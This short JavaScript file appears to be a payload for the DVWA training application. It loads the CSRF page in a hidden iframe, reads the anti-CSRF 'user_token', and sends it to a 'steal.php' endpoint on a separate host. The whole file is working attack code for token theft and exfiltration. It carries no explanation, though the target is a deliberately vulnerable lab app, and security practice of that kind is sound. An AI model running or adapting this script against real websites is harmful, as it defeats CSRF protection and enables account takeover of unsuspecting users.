var iframe = document.createElement('iframe');

iframe.src='http://192.168.255.151:8081/DVWA-master/vulnerabilities/csrf/';

iframe.id='vul';

iframe.style.display="none"

document.body.appendChild(iframe);

window.onload=function(){

	var xmlhttp=new XMLHttpRequest();

	var token=document.getElementById('vul').contentWindow.document.getElementsByName("user_token")[0].value;

	var url="http://192.168.1.101:808/steal.php?data=".concat(token);

	xmlhttp.open("GET",url,true);

	xmlhttp.send();

}